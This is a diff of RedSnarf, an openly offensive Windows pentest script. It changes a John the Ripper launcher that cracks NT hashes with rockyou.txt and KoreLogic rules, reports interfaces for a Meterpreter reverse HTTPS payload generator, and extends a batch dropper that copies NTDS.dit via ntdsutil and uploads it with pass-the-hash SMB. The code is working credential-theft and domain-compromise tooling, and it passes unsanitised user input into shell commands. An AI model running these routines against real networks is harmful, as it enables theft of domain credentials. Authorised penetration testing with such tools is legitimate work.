@@ -317,38 +317,68 @@ def gppdecrypt(cpassword_pass):
 
 #Routine helps start John the Ripper
 def quickjtr(filename):
+		
+	LogicRule = []
+	LogicRule.append("KoreLogicRulesAppendNumbers_and_Specials_Simple")
+	LogicRule.append("KoreLogicRulesL33t")
+	LogicRule.append("KoreLogicRulesAppendYears")
+	LogicRule.append("KoreLogicRulesAppendSeason")
 	
+	WordList=""
+	KoreRuleToUse=""
+
 	if os.path.isfile("/usr/share/wordlists/rockyou.txt"):		
 		print colored("[+]Detected /usr/share/wordlists/rockyou.txt",'green')
-		
-		#John The Ripper Configuration Location
-		#/etc/john/john.conf
-		if 'KoreLogicRules' in open("/etc/john/john.conf").read():
-			print colored("[+]Detected that KoreLogicRules in installed in john.conf",'green')	
-			UseKoreLogic = raw_input("Would you like to use KoreLogicRules?: Y/(N) ")
-		
-			if UseKoreLogic in yesanswers:	
-				print colored("[+]Some common rules are:",'green')
-				print colored("[+]KoreLogicRulesAppendNumbers_and_Specials_Simple",'blue')
-				print colored("[+]KoreLogicRulesL33t",'blue')
-				print colored("[+]KoreLogicRulesAppendYears",'blue')
-				print colored("[+]KoreLogicRulesAppendSeason",'blue')
-				KoreLogicRule = raw_input("Please enter the rule you wish to use: ")
-				print colored("[+]Starting John The Ripper",'yellow')
-				print colored("[+]john --format=nt "+str(filename)+ " --wordlist=/usr/share/wordlists/rockyou.txt --rules:"+KoreLogicRule,'yellow')
-				os.system("john --format=nt "+str(filename)+ " --wordlist=/usr/share/wordlists/rockyou.txt --rules:"+KoreLogicRule)
-			else:
-				print colored("[+]Starting John The Ripper",'yellow')
-				print colored("[+]john --format=nt "+str(filename)+ " --wordlist=/usr/share/wordlists/rockyou.txt --rules",'yellow')
-				os.system("john --format=nt "+str(filename)+ " --wordlist=/usr/share/wordlists/rockyou.txt --rules")
+		UseRockYou = raw_input("Would you like to use rockyou.txt as your wordlist?: Y/(N) ")
+		if UseRockYou in yesanswers:	
+			print colored("[+]Selected as wordlist - /usr/share/wordlists/rockyou.txt",'green')
+			WordList = "/usr/share/wordlists/rockyou.txt"
+		elif UseRockYou in noanswers:
+			Alternative = raw_input("Would you like to use an alternative wordlist?: Y/(N) ")
+			if Alternative in yesanswers:	
+				WordList = raw_input("Enter path to wordlist: ")
+				print colored("[+]Selected as wordlist - "+WordList,'green')
+			else:	
+				WordList = ""
 		else:
-			print colored("[+]Starting John The Ripper",'yellow')
-			print colored("[+]john --format=nt "+str(filename)+ " --wordlist=/usr/share/wordlists/rockyou.txt --rules",'yellow')
-			os.system("john --format=nt "+str(filename)+ " --wordlist=/usr/share/wordlists/rockyou.txt --rules")
-	else:
-		print colored("[+]Starting John The Ripper",'yellow')
+			WordList=""
+
+	if WordList!="" and 'KoreLogicRules' in open("/etc/john/john.conf").read():
+		print colored("[+]Detected that KoreLogicRules in installed in john.conf",'green')	
+		UseKoreLogic = raw_input("Would you like to use KoreLogicRules?: Y/(N) ")
+	
+		if UseKoreLogic in yesanswers:	
+			print colored("[+]Some common rules are:",'green')
+			print colored("[0]KoreLogicRulesAppendNumbers_and_Specials_Simple",'blue')
+			print colored("[1]KoreLogicRulesL33t",'blue')
+			print colored("[2]KoreLogicRulesAppendYears",'blue')
+			print colored("[3]KoreLogicRulesAppendSeason",'blue')
+			print colored("[4]Other",'blue')
+			KoreLogicRule = raw_input("Please enter the number of the rule you wish to use: ")	
+			if KoreLogicRule=="4":
+				KoreRuleToUse=raw_input("Please enter the rule you wish to use: ")
+				if KoreRuleToUse=="":
+					print colored("[-]No rule entered...",'red')
+					#exit(1)
+				else:
+					print colored("[+]Selected KoreLogicRule - "+ KoreRuleToUse,'green')
+			else:
+				print colored("[+]Selected KoreLogicRule - "+ str(LogicRule[int(KoreLogicRule)]),'green')
+				KoreRuleToUse = str(LogicRule[int(KoreLogicRule)])
+
+	if WordList=="" and KoreRuleToUse=="":
+		print colored("[+]Starting John The Ripper with No Wordlist or KoreLogicRules",'yellow')
 		print colored("[+]john --format=nt "+str(filename)+ " --rules",'yellow')
 		os.system("john --format=nt "+str(filename)+" --rules")
+	elif WordList!="" and KoreRuleToUse=="":
+		print colored("[+]Starting John The Ripper with Wordlist and No KoreLogicRules",'yellow')
+		print colored("[+]john --format=nt "+str(filename)+ " --wordlist="+WordList+" --rules",'yellow')
+		os.system("john --format=nt "+str(filename)+ " --wordlist=" +WordList+" --rules")
+	elif WordList!="" and KoreRuleToUse!="":
+		print colored("[+]Starting John The Ripper with Wordlist and KoreLogicRules",'yellow')
+		print colored("[+]john --format=nt "+str(filename)+ " --wordlist="+WordList+" --rules:"+KoreRuleToUse,'yellow')
+		os.system("john --format=nt "+str(filename)+ " --wordlist=" +WordList+" --rules:"+KoreRuleToUse)
+	
 	
 #Routine Write out a batch file which can be used to turn on/off LocalAccountTokenFilterPolicy
 def WriteLAT():
@@ -1626,7 +1656,7 @@ def main():
 
 #Display the user menu.
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.3k", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.3l", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
 
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
@@ -1782,6 +1812,10 @@ if meterpreter_revhttps in yesanswers:
 		print colored("[+]Generating Meterpreter Reverse HTTPS Powershell Code & Listener:\n",'green')
 		
 		print colored("[+] IP Address of eth0 is "+get_ip_address('eth0'),'yellow')
+		
+		if get_ip_address('eth1')!="":
+			print colored("[+] IP Address of eth1 is "+get_ip_address('eth1'),'yellow')
+
 		if get_ip_address('tap0')!="":
 			print colored("[+] IP Address of tap0 is "+get_ip_address('tap0'),'yellow')
 
@@ -2280,7 +2314,7 @@ if golden_ticket in yesanswers:
 							print colored("[+]To export - export KRB5CCNAME='"+outputpath+targets[0]+"/administrator.ccache'",'yellow')
 
 					else:
-						print colored("[-]Something Went Wrong Creating Golden-Ticket...",'red')
+						print colored("[-]Something went wrong creating Golden-Ticket...",'red')
 						logging.error("[-]Something went wrong creating Golden-Ticket")
 
 			sys.exit()
@@ -2919,10 +2953,18 @@ if ntds_util in yesanswers or ntds_util=="d":
 	#Currently undocumented function - creates a bat file which can be copied and pasted to the remote machine if the process can't be fully automated
 	if ntds_util=='d':
 		print colored("[+]Writing NTDS.dit dropper to /tmp/ntds.bat",'green')
-		print colored("[+]Copy this file via RDP to the remote machine then run it, then copy the c:\\redsnarf folder back to this machine",'yellow')
+		print colored("[+]Copy this file via RDP to the remote machine then run it",'yellow')
+		print colored("[+]Then copy the c:\\redsnarf folder back to this machine",'yellow')
 		pscommand="ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full c:\\redsnarf\" q q"
 		fout=open('/tmp/ntds.bat','w')
 		fout.write('@echo off\n')
+		fout.write('cls\n')
+		fout.write('echo .\n')
+		fout.write('echo NTDS.DIT Backup\n')
+		fout.write('echo R Davy - NCCGroup	\n')
+		fout.write('echo .\n')
+		fout.write('echo Full backup will be created in c:\\redsnarf\"\n')
+		fout.write('echo .\n')
 		fout.write(pscommand)
 		fout.close() 
 
@@ -2949,6 +2991,13 @@ if ntds_util in yesanswers or ntds_util=="d":
 			pscommand="ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full c:\\redsnarf\" q q"
 			fout=open('/tmp/ntds.bat','w')
 			fout.write('@echo off\n')
+			fout.write('cls\n')
+			fout.write('echo .\n')
+			fout.write('echo NTDS.DIT Backup\n')
+			fout.write('echo R Davy - NCCGroup	\n')
+			fout.write('echo .\n')
+			fout.write('echo Full backup will be created in c:\\redsnarf\"\n')
+			fout.write('echo .\n')
 			fout.write(pscommand)
 			fout.close() 
 			os.system("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put ntds.bat\' 2>/dev/null")
